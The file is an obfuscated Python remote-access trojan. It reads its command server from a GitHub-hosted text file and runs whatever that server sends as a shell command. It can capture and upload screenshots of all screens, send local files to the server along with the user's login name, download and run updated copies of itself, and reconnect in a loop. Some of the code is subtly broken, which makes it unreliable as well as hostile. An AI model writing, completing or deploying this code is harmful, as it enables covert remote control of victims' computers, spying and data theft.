import sys,subprocess,socket,time,requests
from PIL import ImageGrab
ddTZVMyZKxG = "04.12.24.6"
fFbrxQQCKlrPELLdvkI = ""
KrmARhURrvLjYvQrfKrRE = ""
KFchdLtCBYHhK = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
IozxsuyMZlFmdYvvIWWrBp = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
TjzWnAeHwXDhTaUIUjFxT = "!"
def kCwLDYjISeypaxSg(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def hUChMWoclUBWZ(s):
	inEfsPVtGDnj = s.recv(1024)
	if len(inEfsPVtGDnj)==0:
		return True
	yAvIdnQUWRqbGSSFXemiE = inEfsPVtGDnj.decode("utf-8")
	if not yAvIdnQUWRqbGSSFXemiE.startswith(TjzWnAeHwXDhTaUIUjFxT):
		proc = subprocess.run(inEfsPVtGDnj.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	qbCpejCMXIDVjXvqehoFUf = yAvIdnQUWRqbGSSFXemiE.split(" ")[0][1:]
	if qbCpejCMXIDVjXvqehoFUf == "download":
		iSaTTil(s, yAvIdnQUWRqbGSSFXemiE)
	elif qbCpejCMXIDVjXvqehoFUf == "screenshot":
		XlGFlLnUIaWIdbhPvdC(s)
	elif qbCpejCMXIDVjXvqehoFUf == "qcCtZHtKfRbgGlUxMMu":
		s.send(bytes(ddTZVMyZKxG, "utf-8"))
def iSaTTil(s, yAvIdnQUWRqbGSSFXemiE):
	JnVDFkJIeGTTVgLRNSHYHq = yAvIdnQUWRqbGSSFXemiE.replace(TjzWnAeHwXDhTaUIUjFxT+"screenshot ", "").split(",")
	results = []
	for f in JnVDFkJIeGTTVgLRNSHYHq:
		results += BPNGMRqtoF(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def XlGFlLnUIaWIdbhPvdC(yAvIdnQUWRqbGSSFXemiE):
	UPSGwyuKbuOLdtl = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	UPSGwyuKbuOLdtl.save(fpath)
	UPSGwyuKbuOLdtl.close()
	r = BPNGMRqtoF(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def BPNGMRqtoF(KxtLUgwbilfKloPLSxGx, SUOayziMyIXDlkQBHPAXpN, VTGMBhB=None):
	if not os.path.exists(KxtLUgwbilfKloPLSxGx):
		return "FILE NOT FOUND: "+KxtLUgwbilfKloPLSxGx
	headers = {"user":os.getlogin()}
	if VTGMBhB is not None:
		headers = {**headers, **VTGMBhB}
	requests.post(fFbrxQQCKlrPELLdvkI+":"+KrmARhURrvLjYvQrfKrRE+"/"+SUOayziMyIXDlkQBHPAXpN,
		files={open(KxtLUgwbilfKloPLSxGx, "rb")},
		headers=headers)
	return "SUCCESS"
def lZXVQFSfenHznhxqCm():
	if fFbrxQQCKlrPELLdvkI == "" or KrmARhURrvLjYvQrfKrRE == "":
		inEfsPVtGDnj = requests.get(KFchdLtCBYHhK).text.replace("\n","").split(":")
		fFbrxQQCKlrPELLdvkI = inEfsPVtGDnj[0].strip()
		KrmARhURrvLjYvQrfKrRE = inEfsPVtGDnj[1].strip()
		qcCtZHtKfRbgGlUxMMu = inEfsPVtGDnj[2].strip()
	return fFbrxQQCKlrPELLdvkI, KrmARhURrvLjYvQrfKrRE, qcCtZHtKfRbgGlUxMMu
def QbsebJwWsIRaxVb():
	CdXnduQCh = os.path.basename(__file__)
	fileType = CdXnduQCh.split(".")[-1]
	XryjXFTuHSxDp = CdXnduQCh.replace(fileType,"") +"."+ddTZVMyZKxG + fileType
	VRuGFaKephWXfhsnWM = os.path.join(os.path.getcwd(), XryjXFTuHSxDp)
	with open(XryjXFTuHSxDp, "wb+") as f:
		f.write(requests.get(IozxsuyMZlFmdYvvIWWrBp+"/file"+VRuGFaKephWXfhsnWM.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+VRuGFaKephWXfhsnWM)
	elif fileType == ".pyw":
		os.system("python "+VRuGFaKephWXfhsnWM")
def NtPOnJbL():
	pass
def zWCsNVqbDCSBSa():
	h, p, v = lZXVQFSfenHznhxqCm()
	if ddTZVMyZKxG != v:
		QbsebJwWsIRaxVb()
	NtPOnJbL()
	wxFgxCSiHJlwhkhaga = bytes("["+ddTZVMyZKxG+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				OpJMjXBqpBSKftuA=False
				try:
					s=kCwLDYjISeypaxSg(h, p)
					while not OpJMjXBqpBSKftuA:
						s.send(wxFgxCSiHJlwhkhaga)
						OpJMjXBqpBSKftuA=hUChMWoclUBWZ(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(zWCsNVqbDCSBSa())
